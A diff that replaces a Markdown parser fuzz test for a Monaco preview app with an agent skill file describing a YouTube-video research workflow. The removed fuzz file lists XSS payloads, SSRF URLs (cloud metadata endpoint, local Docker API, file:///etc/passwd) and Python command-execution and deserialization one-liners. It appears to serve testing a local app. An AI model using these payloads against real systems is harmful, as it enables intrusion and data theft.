@@ -1,487 +1,275 @@
 ---
-name: monaco-overlooked-edge-test-v6
-description: Same file, rewritten directly in place with even more aggressive SSRF/RCE-style payloads, malformed object syntax, strange characters, and Monaco-stressing patterns
-title: advanced-monaco-fuzz-suite
-author: test-suite
-mode: fuzz-validation
-security:
-  execution: false
-  scripts: false
-  sandbox: true
-  intent: malformed-input-only
+name: youtube-video-research
+description: Enhance any deep research task with first-hand YouTube video evidence via manus-analyze-video. Highly recommended whenever the task involves deep research, investigation, report writing, industry analysis, competitive intelligence, market research, technology trends, cultural analysis, policy research, or any information-gathering task that would benefit from expert talks, interviews, keynotes, panels, documentaries, product demos, vlogs, or conference presentations on YouTube. Also use when the user explicitly mentions YouTube, video sources, or asks for first-hand evidence. YouTube contains unfiltered first-person insights (CEO interviews, expert panels, practitioner vlogs, conference talks, earnings calls) unavailable in text articles, making it a critical primary source for virtually any research topic.
 ---
 
-# MONACO ADVANCED EDGE TEST SUITE v5
+# YouTube Video Research
 
-This file is intentionally hostile to Markdown parsers and preview systems. It mixes malformed frontmatter, invalid URLs, broken images, HTML injection payloads, iframe/embed/object tags, SVG, raw scripts, code fences, Unicode control characters, recursive syntax traps, and malformed link syntax to push Monaco and local preview rendering to the limit.
+Leverage YouTube as a **primary source of first-hand information** for research tasks. YouTube hosts CEO interviews, founder keynotes, earnings calls, expert panels, conference talks, product demos, practitioner vlogs, cultural documentaries, policy discussions, technical deep-dives, and educational content that contain unfiltered, first-person insights unavailable in text articles. This skill orchestrates video discovery, analysis, and synthesis into a structured research workflow.
 
----
+## Trigger Guidance
 
-## 1. Frontmatter ambiguity and YAML chaos
+This skill is **highly recommended for deep research tasks**, not just travel, company, or person research. 
 
----
-not-valid-yaml: [unterminated
-still-inside: true
-nested:
-  - one
-  - two
-  - [oops
-bad: "unterminated quote
-truthy: yes
-falsey: no
-nullish: null
-anchor: &anchor
-  value: 123
-alias: *anchor
----
+**Explicit trigger** — the user mentions YouTube, video sources, interviews, keynotes, vlogs, podcasts, conference talks, or asks for first-hand evidence.
 
-# This should not be treated as real markdown if the parser misinterprets the frontmatter boundary.
+**Implicit trigger** — any research, investigation, or report-writing task where YouTube videos would materially improve the answer by providing first-hand evidence. This includes but is not limited to:
 
----
+| Research category | Why YouTube adds value | Example topics |
+|---|---|---|
+| Industry / market analysis | Expert panels, analyst deep-dives, conference talks | AI chip market, fintech trends, SaaS landscape |
+| Company research / due diligence | CEO interviews, earnings calls, product demos | Startup investigation, competitor analysis |
+| Technology trends | Conference presentations, developer talks, demos | AI models, database comparisons, dev tools |
+| Policy / regulatory research | Panel discussions, government hearings, legal podcasts | EU AI Act, export controls, central bank policy |
+| Person / public-figure profiling | Interviews, podcast appearances, keynotes | Founder profiles, researcher tracking |
+| Travel / destination research | Vlogs, local guides, cost breakdowns | City guides, accommodation reviews |
+| Cultural / entertainment analysis | Documentaries, reviews, fan analysis, creator content | Anime impact, music history, game design |
+| Financial / economic research | Economist talks, earnings calls, market analysis | Stock valuation, capital flows, real estate |
+| Science / academic topics | Lectures, conference presentations, lab tours | Protein design, climate research |
+| Product / tool comparison | Review videos, hands-on demos, user testimonials | Software tools, hardware, consumer products |
 
-## 2. Broken URLs, links, images, and autolinks
+If the research topic exists, there are almost certainly relevant YouTube videos. **Default to using this skill** for comprehensive research rather than defaulting to skip it.
 
-[valid](https://example.com)
-[missing]()
-[broken](ht!tp://invalid)
-[weird](javascript:this_should_not_execute)
-[space](https://exa mple.com)
-[bracket](https://example.com/path[broken)
-[brace](https://example.com/{oops)
-[quote](https://example.com/"quoted")
-[unicode](https://exämple.测试)
-[empty]( )
-[bad-host](https://[::1)
-[bad-scheme](http://)
-[bad-port](https://example.com:99999)
-[mailto](mailto:test@example.com)
-[relative](/docs/guide)
-[hash](#section)
-[data](data:text/plain,hello)
-[blob](blob:https://example.com/1234)
+## Core Tools
 
-![](missing.png)
-![alt](not-a-url)
-![trailing](https://example.com/image.jpg
-![broken-image](javascript:alert(1))
-![svg](data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>)
-![encoded](https://example.com/path%20with%20spaces)
+| Tool | Purpose | When to use |
+|---|---|---|
+| `search` (type: `info` or `news`) | Discover YouTube videos and gather web context | Always; first step in every research task |
+| `manus-analyze-video` | Analyze YouTube video content with multimodal LLM | After discovering relevant videos; the core analytical tool |
+| `search` (type: `research`) | Find academic papers, industry reports for cross-validation | When rigorous sourcing is needed |
+| `webpage_extract` or browser | Read articles, transcripts, show notes linked from videos | When supplementary text context is needed |
 
-<https://example.com>
-<mailto:test@example.com>
-<javascript:alert(1)>
-<https://[::1>
-<http://exa mple.com>
-<file:///etc/passwd>
+## Core Workflow
 
----
+Every research task follows this five-step loop. Repeat steps 2-4 for each relevant video.
 
-## 3. Reference-style link and footnote traps
+### Step 1: Theme-Based Video Discovery
 
-[ref1]: https://example.com
-[ref2]: javascript:alert(1)
-[ref3]: data:text/html,<script>alert(1)</script>
-[ref4]: /local/path
-[ref5]: https://example.com/space here
-[ref6]: https://example.com/"quote"
-[ref7]: https://example.com/\nnewline
+Before searching, decompose the research goal into **distinct research themes**. Each theme becomes a separate search-and-analysis unit. This ensures broad coverage and prevents tunnel vision on a single angle.
 
-[ref1]
-[ref2]
-[ref3]
-[ref4]
-[ref5]
-[ref6]
-[ref7]
+**Theme decomposition process:**
 
-[^note1]: This is a note
-[^note2]: javascript:alert(1)
-[^note3]: [link](https://example.com)
+1. Identify 4-6 research themes from the user's request (e.g., for a company investment analysis: "industry background", "business model & technology", "financial data & valuation", "customer & partnerships", "bull case & growth catalysts", "bear case & risk factors").
+2. For each theme, run 1-2 targeted YouTube search calls.
+3. Select **2-3 videos per theme** to ensure multiple perspectives on each dimension.
+4. Total target: **12-20 videos** for deep research, **8-12** for standard research. The power of this workflow lies in **high video volume** across diverse themes.
 
-[^note1]
-[^note2]
-[^note3]
+**Theme decomposition examples:**
 
----
+| Research goal | Themes | Videos per theme |
+|---|---|---|
+| Company investment analysis | Industry context, Business model, Financials, Customers, Bull case, Bear case | 2-3 each = 12-18 total |
+| Technology comparison | Architecture, Performance benchmarks, Developer experience, Production use cases, Cost analysis | 2-3 each = 10-15 total |
+| Market entry research | Market size, Competitors, Regulatory landscape, Customer needs, Distribution channels | 2-3 each = 10-15 total |
+| Person profile | Career history, Leadership style, Public controversies, Vision & philosophy, Peer assessments | 2-3 each = 10-15 total |
 
-## 4. Iframe, object, embed, script, style, and SVG stress
+**Query construction rules:**
 
-<iframe src="https://example.com"></iframe>
-<iframe src="javascript:alert(1)"></iframe>
-<iframe srcdoc="<html><body><script>alert(1)</script></body></html>"></iframe>
-<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
-<iframe src="https://example.com" width="100" height="100"></iframe>
-<iframe></iframe>
+- Always include `YouTube` in at least one query variant.
+- Include the content type: `interview`, `talk`, `panel`, `keynote`, `vlog`, `earnings call`, `podcast`, `review`, `documentary`, `demo`, `conference`, `lecture`, `analysis`, `deep dive`.
+- Include the entity name: person, company, destination, product, topic.
+- Use 2-3 query variants per search call to maximize coverage.
+- **Vary query angles per theme**: e.g., for "bear case" theme, search for `[company] risks concerns analysis YouTube`, `[company] stock bearish case YouTube`, `[company] problems criticism YouTube`.
 
-<object data="https://example.com"></object>
-<object data="javascript:alert(1)"></object>
-<embed src="https://example.com"></embed>
-<embed src="javascript:alert(1)"></embed>
+**Examples across research types:**
 
-<script>console.log('script tag')</script>
-<script>alert(1)</script>
-<script src="https://example.com/x.js"></script>
+| Research goal | Query variants |
+|---|---|
+| Company research on Stripe | `Stripe CEO Patrick Collison interview YouTube`, `Stripe company culture keynote YouTube`, `Stripe product demo YouTube` |
+| AI industry trends | `AI industry trends 2025 expert panel YouTube`, `AI market analysis conference talk YouTube`, `AI startup landscape deep dive YouTube` |
+| Policy research on EU AI Act | `EU AI Act impact analysis YouTube`, `EU AI regulation panel discussion YouTube`, `AI compliance legal expert talk YouTube` |
 
-<style>.x{color:red}</style>
-<style>@import url(https://example.com/style.css);</style>
-<link rel="stylesheet" href="https://example.com/x.css">
+For **company research**, prioritize videos featuring the **top leader (CEO/founder/principal executive)**. Search patterns:
 
-<img src=x onerror=alert(1)>
-<img src="javascript:alert(1)">
-<img src="https://example.com/x.png" alt="x" onerror="alert(1)">
+- `[CEO name] interview YouTube`
+- `[CEO name] [company] keynote YouTube`
+- `[company] earnings call YouTube`
+- `[CEO name] podcast appearance YouTube`
 
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
-  <circle cx="10" cy="10" r="5" />
-</svg>
+### Step 2: Select and Prioritize Videos
 
-<svg><script>alert(1)</script></svg>
-<svg><animate attributeName="x" dur="1s" repeatCount="indefinite" /></svg>
+From search results, select videos based on these criteria:
 
-<div class="x" onclick="alert('x')">raw html block</div>
-<div data-test="1" style="background:url(javascript:alert(1))">styled div</div>
-<a href="javascript:alert(1)">click me</a>
-<a href="data:text/html,<script>alert(1)</script>">data link</a>
-<unknown-tag attr="value"></unknown-tag>
-<unknown-tag attr="value">
-  <div>nested</div>
-</unknown-tag>
+| Priority | Signal | Example |
+|---|---|---|
+| Highest | First-person: subject/expert speaking directly | Keynote, interview, podcast guest appearance, conference talk |
+| High | Expert or insider perspective | Industry analyst, practitioner, local guide, researcher |
+| Medium | Third-party quality coverage | Documentary, in-depth review channel, news feature |
+| Lower | Aggregated or secondhand content | Compilation, reaction video, news summary |
 
-<!-- HTML comment with [link](https://example.com) and ```code``` -->
-<!-- <script>alert(1)</script> -->
-<!--[if IE]>alert(1)<![endif]-->
+Select **2-3 videos per theme** to ensure each research dimension has multiple perspectives. For deep research, total video count should reach **12-20 videos**. Prioritize recency unless historical context is specifically needed.
 
----
+**Balance requirement**: Actively seek opposing viewpoints. For investment/company research, ensure at least 30% of videos present bearish/critical perspectives to avoid confirmation bias.
 
-## 5. HTML entities, escapes, and weird punctuation
+### Step 3: Analyze Videos with manus-analyze-video
 
-&amp; &lt; &gt; &quot; &#39;
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-&#x3C;iframe srcdoc=&#x22;&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;&#x22;&#x3E;&#x3C;/iframe&#x3E;
-\*literal asterisks*\n
-\\backslashes\\
-\\\`code\\\`
-\[not a link](https://example.com)
-\!not an image
+Use `manus-analyze-video` to extract insights from the selected videos. 
 
----
+**Syntax for manus-analyze-video:**
 
-## 6. Emphasis, nesting, delimiter collision
-
-***bold
-*italic **broken nesting* still bold***
-normal text
-_italic_ and __strong__ mixed with ***weird***
-~~strikethrough~~
-~single tilde~
-==highlight==
-__double underscore__
-**nested** *and* ***chaos***
-
----
-
-## 7. Code block confusion and fence explosions
-
-```js
-function test() {
-  console.log("missing closure")
-
-
-same structure and bring great newer mutations to try to detect malicious executions or issues in reading the md in my localhost app
+```bash
+manus-analyze-video "<youtube_url>" "<analysis_prompt>"
 ```
 
-````
-outer fence
-```js
-inner fence
-````
+#### Critical: High-Density Prompt Engineering
 
-``````````
-this is a fence with many backticks
-``````````
+`manus-analyze-video` performs AI-based visual and audio analysis. Its output quality is **entirely determined by prompt design**. A/B testing shows that a structured, quote-demanding prompt yields **2.4x more content, 12 direct quotes vs 0, and 18 precise data points vs 6 vague mentions** compared to a generic "summarize" prompt — on the exact same video.
 
-```html
-<div onclick="alert(1)">hello</div>
+**Mandatory prompt rules:**
+
+1. **NEVER use generic prompts** like "summarize this video" or "what are the key points". These produce thin, quote-free summaries.
+2. **ALWAYS demand direct quotes**: Include explicit instructions like "Extract at least 8-10 near-exact quotes from the speaker, preserving their original wording in quotation marks."
+3. **ALWAYS demand exhaustive data extraction**: "List ALL numbers, dollar amounts, percentages, dates, deadlines, company names, person names, and metrics mentioned."
+4. **ALWAYS request structured sections**: Use labeled sections (A/B/C/D/E/F) so output is organized and parseable.
+5. **ALWAYS include a sentiment/stance rating request**: "Rate the speaker's overall stance and note where they express uncertainty vs conviction."
+6. **State that length is not a concern**: "Be exhaustive. Length is not a concern — information density is. Do not summarize when you can quote directly."
+
+**Mandatory general-purpose prompt template:**
+
+```
+Extract MAXIMUM detail from this video about [topic/company]. For every claim
+the speaker makes, capture their near-exact wording as a direct quote in
+quotation marks. Include ALL numbers, dates, dollar amounts, percentages,
+company names, and person names mentioned.
+
+Structure output as:
+(A) SPEAKER PROFILE: Name, credentials, disclaimers, sponsors.
+(B) DIRECT QUOTES: At least 8 verbatim or near-verbatim quotes with topic labels.
+(C) ALL DATA POINTS: Every number, metric, date, name as a numbered list.
+(D) KEY ARGUMENTS: Main thesis broken into sub-arguments with supporting quotes.
+(E) COUNTER-ARGUMENTS / RISKS: Every risk, caveat, or opposing view with quotes.
+(F) SENTIMENT: Overall stance rating and confidence level.
+
+Be exhaustive. Length is not a concern — information density is.
+Do not summarize when you can quote directly.
 ```
 
-~~~markdown
-```js
-console.log('inside tildes')
-```
-~~~
+See [/../../../prompt-templates.md](references/../../../test) for domain-specific high-density prompt templates.
 
-```text
-</script><script>alert(1)</script>
-```
+#### Optional: Two-Pass Strategy for Maximum Fidelity
 
-```text
-[link](javascript:alert(1))
-```
+For critical videos where verbatim accuracy is essential (e.g., earnings calls, legal testimony, policy hearings), use a two-pass approach:
 
-```\u0000
-literal weird fence content
-```
+1. **Pass 1 — Raw transcript**: Run `manus-speech-to-text` on the video to get a verbatim text transcript.
+2. **Pass 2 — Structured analysis**: Run `manus-analyze-video` with the high-density prompt for visual context, speaker identification, and structured extraction.
+3. **Merge**: Cross-reference the raw transcript with the structured analysis to get both exact quotes and organized insights.
 
----
+This is optional for most research but recommended when the user specifically needs exact wording or when the video contains dense financial data.
 
-## 8. Lists, tables, blockquotes, and malformed structure
+### Step 4: Cross-Validate with Web Search
 
-- item one
-  - nested item
-    - deeper item
-- item two
-  1. ordered child
-  2. another child
+After analyzing videos, use `search` tool (type: `info` or `news`) to:
 
-> quote line 1
-> quote line 2
->> nested quote
-> > still nested
-> [link](javascript:alert(1))
-> ```js
-> console.log('quoted code')
-> ```
+- Verify factual claims made in videos.
+- Fill gaps: dates, statistics, context not covered in videos.
+- Find contradicting or supporting evidence from other sources.
+- Get the latest updates if videos are older.
 
-| col1 | col2 |
-| --- | --- |
-| a | b |
-| c | d |
+Do not treat video content as ground truth. Speakers may exaggerate, misremember, or present biased views. Cross-validation is mandatory for factual claims.
 
-| broken
-| row |
-| missing separator |
-| x | y | z | w |
+### Step 5: Synthesize into a Quote-Rich, Detail-Dense Report
 
----
+Combine video analysis results and web research into a coherent deliverable. The final report MUST follow these **mandatory output rules**:
 
-## 9. Unicode, zero-width, control characters, and bidi
+#### Rule 1: Direct Quotes Are Mandatory
 
-AA---
+Every major section of the report MUST include at least 2-3 **blockquote citations** of speakers' original words or closely paraphrased statements. Use Markdown blockquote syntax:
 
-## 10. Long-content flood and performance stress
-
-Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
-
-This sentence repeats many times to test parser performance and memory behavior: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
-
-Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
-
----
-
-## 11. Mixed paragraph continuation and malformed whitespace
-
-This paragraph continues
-without a blank line
-and should stay in one block.
-
-This line has trailing spaces.   
-This line has trailing tabs.	
-This line has hard breaks with two spaces.  
-This line should be separate after a blank line.
-
----
-
-## 12. Heading ambiguity and duplicate headings
-
-#not-a-heading
-##not-a-heading
-#######not-a-heading
-# Repeat
-# Repeat
-# Repeat
-
----
-
-## 13. Comment and directive-like content
-
-[//]: # (comment)
-[//]: # "comment"
-<!-- comment -->
-<!--
-multi-line comment
-[link](https://example.com)
-<script>alert(1)</script>
--->
-
----
-
-## 14. Extra mutation set for parser crash coverage
-
-https://example.com/one/two/three/four/five/six/seven/eight/nine/ten?x=1&y=2&z=3#fragment
-https://example.com/path%20with%20spaces/emoji-😀/cjk-你好/rtl-אבג
-https://example.com:443/
-https://example.com:99999/
-https://example.com:abc/
-https://example.com:80/path
-https://example.com?x=1&y=2&z=3
-http://
-https://
-//example.com
-ftp://example.com
-mailto:test@example.com
-tel:+1234567890
-javascript:alert(1)
-data:text/html,<script>alert(1)</script>
-blob:https://example.com/1234
-file:///etc/passwd
-
-[link](https://example.com/path(with(paren))
-[link](https://example.com/path[with[bracket)
-[link](https://example.com/path{with{brace)
-[link](https://example.com/path<with<angle)
-[link](https://example.com/path"with"quote)
-[link](https://example.com/path\with\backslashes)
-[link](https://example.com/path?x=1&y=2&z=3)
-[link](https://example.com/#fragment)
-[link](https://example.com/..)
-[link](https://example.com/%00)
-
----
-
-## 15. Final payload cluster
-
-This section combines everything into one dense block on purpose.
-
-<img src=x onerror=alert(1)>
-<iframe srcdoc='<script>alert(1)</script>'></iframe>
-<svg onload=alert(1)><script>alert(1)</script></svg>
-<a href="javascript:alert(1)">x</a>
-[click me](javascript:alert(1))
-![img](data:image/svg+xml,<svg onload=alert(1)>)
-```html
-<script>alert(1)</script>
-```
-```js
-fetch('https://example.com').then(r=>r.text()).then(console.log)
+```markdown
+> "The exact or closely paraphrased words from the speaker go here. This is what
+> makes the report credible and vivid." [3]
 ```
 
-<!--
-<script>alert(1)</script>
-[link](javascript:alert(1))
--->
+Each blockquote MUST be attributed with a numeric citation linking to the source video in the References section. Acceptable attribution patterns:
 
-[//]: # (comment)
+- `> "Quote text here." [3]` — citation at end of quote
+- Preceding paragraph names the speaker: `CEO Jake DeWitte explained in his NYSE interview:` followed by blockquote
 
----
+**Minimum quote density**: At least **1 blockquote per 300 words** of report body. A 3,000-word report needs at least 10 blockquotes.
 
-## 16. SSRF / RCE / object / parser stress cluster
+#### Rule 2: Detail Expansion Is Mandatory
 
-http://127.0.0.1:22
-http://169.254.169.254/latest/meta-data/
-http://localhost:2375/v1.24/containers/json
-https://example.com@evil.test/
-https://example.com:443@evil.test/
-https://example.com:443#@evil.test
-https://example.com:443/?redirect=http://127.0.0.1:8080
-http://[::1]:80
-https://[::1]:443
-http://[::ffff:127.0.0.1]:80/
-http://user:pass@[::1]:443/path
-javascript:alert(1)
-javascript://example.com%0Aalert(1)
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+
-vbscript:msgbox(1)
-file:///etc/passwd
-gopher://127.0.0.1:70
-dict://127.0.0.1:2628
-ldap://127.0.0.1:389
-jar:http://example.com!/foo
-blob:https://example.com/1234
-mailto:test@example.com?subject=hi
+Do NOT summarize video insights into single-sentence bullet points. Every key finding MUST be expanded into a full paragraph (3-5 sentences minimum) that includes:
 
-[ssrf](https://example.com@evil.test)
-[double](https://example.com:443@evil.test/path?x=1)
-[broken](https://example.com/%0d%0aSet-Cookie:abc=1)
-[host](https://exa mple.com)
-[unicode](https://example.com/💣)
-[slash](https://example.com/\\evil)
+- **Context**: Who said it, in what setting, and why it matters
+- **Specifics**: Numbers, dates, names, technical details mentioned
+- **Quote**: The speaker's own words as a blockquote
+- **Implication**: What this means for the research question
 
-<img src="https://example.com" onerror="fetch('http://127.0.0.1:8000')">
-<iframe src="http://127.0.0.1:8080"></iframe>
-<object data="http://169.254.169.254/latest/meta-data/"></object>
-<embed src="file:///etc/passwd"></embed>
-<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">x</text></a></svg>
-<svg><script>alert(1)</script></svg>
+**Bad example** (too brief):
+> Oklo has a 14 GW customer pipeline.
 
-```json
-{"x":"y","nested":{"a":[1,2,3],"bad":"unterminated"}}
+**Good example** (properly expanded):
+> At the 2025 KPMG Tech and Innovation Symposium, CEO Jacob DeWitte revealed that Oklo's customer pipeline has grown dramatically over the past 18 months, reaching 14,100 MW (14.1 GW). This figure is anchored by a 12 GW non-binding Master Power Agreement with Switch — one of the largest corporate clean energy agreements ever signed — along with a 1.2 GW prepayment-backed agreement with Meta and a 500 MW letter of intent from Equinix that included a $25 million prepayment. DeWitte emphasized the structural nature of this demand:
+>
+> > "Tech giants are looking for baseload power to fuel AI training and inference. Intermittent renewables simply cannot meet the 24/7 steady-state demands of data centers." [2]
+>
+> However, independent analysts caution that the vast majority of this pipeline consists of non-binding letters of intent that carry no legal obligation. [3]
+
+#### Rule 3: Multi-Source Triangulation
+
+When multiple videos address the same topic, present them as a dialogue — showing agreement, disagreement, or complementary perspectives. Do not just list each video's view sequentially; weave them into a narrative.
+
+#### Rule 4: Structured Source Attribution
+
+Always include:
+- **Inline numeric citations** `[1]` `[2]` linking to the References section
+- **Speaker identification** before quotes (name, title, credibility note)
+- A **Source Videos Analyzed** table listing all videos
+
+#### Output Structure
+
+```markdown
+# [Research Title]
+
+## Executive Summary
+[2-3 paragraphs with key findings, including at least 2 blockquotes from different sources]
+
+## [Theme 1 Title]
+[3-5 paragraphs per theme, each with blockquotes, specific data, and source attribution]
+
+## [Theme 2 Title]
+[Same depth as above]
+
+## [Additional themes...]
+
+## Source Videos Analyzed
+| # | Title | Speaker/Creator | Stance | URL | Key Contribution |
+|---|---|---|---|---|---|
+
+## References
+[1]: [Video/source title and URL]
+[2]: [Video/source title and URL]
+...
 ```
 
-```js
-const payload = "a\\b\\c\\d\\e";
-const obj = { foo: "bar", baz: [1,2,3], bad: "unterminated };
-console.log(payload)
-```
+Adapt this structure based on the specific research type. See reference files for domain-specific output templates:
+- [../../../company-research.py](../../../company-research.py)
+- [../../../company-research.py](../../../company-research.py)
+- [references/travel-research.md](references/travel-research.md)
 
-A### Additional parser ambiguity / lexer stress
+## Multi-Video Synthesis Strategy
 
-````
-````
-``````
-````````
-``````````
-```
-````
-~~~
-~~~
----
-***
-___
-___
-***
-[[[[]]]]
-{{{{{{{{{{
-((((((()))))))
-<<<>>>><<>>>
-> > > > >
-[[]]
-[[]][]
-[]([])
-()[]{}
-{}[]()
+When analyzing multiple videos on the same topic, synthesize rather than list sequentially:
 
-### Python execution / eval style payloads
+| Approach | When to use |
+|---|---|
+| Thematic synthesis | Group insights by theme across videos (e.g., "Strategy", "Culture", "Challenges") |
+| Chronological narrative | Track evolution over time (e.g., founder's changing vision across interviews) |
+| Comparative analysis | Videos present different perspectives on the same topic |
+| Evidence triangulation | Build a factual picture from multiple partial sources |
+| **Bull-bear dialogue** | Present opposing views as a structured debate with quotes from each side |
 
-__import__('os').system('id')
-__import__('os').popen('id').read()
-__import__('subprocess').check_output(['id'])
-__import__('subprocess').run(['id'], capture_output=True, text=True).stdout
-__import__('builtins').eval("__import__('os').system('id')")
-__import__('builtins').exec("import os; os.system('id')")
-exec("import os; os.system('id')")
-eval("__import__('os').system('id')")
-getattr(__import__('os'), 'system')('id')
-globals()['__builtins__'].__dict__['__import__']('os').system('id')
-import os; os.system('id')
-import subprocess; subprocess.check_output(['id'])
-import socket; socket.create_connection(('127.0.0.1', 4444), 1)
-import urllib.request; urllib.request.urlopen('http://127.0.0.1:4445')
-import requests; requests.get('http://127.0.0.1:4446')
-import yaml; yaml.load('!!python/object/apply:os.system ["id"]', Loader=yaml.Loader)
-import pickle; pickle.loads(b'cos\nsystem\ns\n(S\'id\'\ntR.')
-import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))
+## Quality Safeguards
 
-### Structured syntax collision traps
-
-```yaml
-foo: [1, 2, 3
-bar: {a: 1, b: 2
-baz: |
-  one
-  two
-  three
-```
-
-```js
-(function(){
-  const s = "\\";
-  const t = /foo\/(bar)/;
-  return [s, t];
-})()
-```
-
-```text
-{{ user.name }}
-${process.env.SECRET}
-<% if (x) {%>oops<%}%>
-```
+| Mistake | Correct behavior |
+|---|---|
+| Analyzing too few videos (< 8 for deep research) | Target 12-20 videos for deep research, 2-3 per theme. **High volume is the core value of this skill.** |
+| Using generic "summarize" prompts | Use the mandatory high-density prompt template; MUST request 8+ direct quotes, ALL data points, and structured sections (A-F) |
+| Writing a report without blockquote citations | MUST include ≥1 blockquote per 300 words of report body |
+| Summarizing findings as brief bullet points | Expand every finding into 3-5 sentence paragraphs with context, data, quote, implication |
+| Treating speaker claims as facts | Cross-validate with web search; label opinions vs. facts |
+| Only including bullish/positive videos | Ensure ≥30% of videos present critical/bearish perspectives |
+| Dumping raw analysis without synthesis | Weave multi-source insights into thematic narratives with quote dialogues |
+| Forgetting to include video links | Always provide YouTube URLs in the Source Videos table and References |
+| **Analysis Failure (e.g., video deleted, no transcript, too long)** | **Fallback:** Use `search` to find text summaries, articles, or alternative videos on the same topic. Do not halt the research process. |
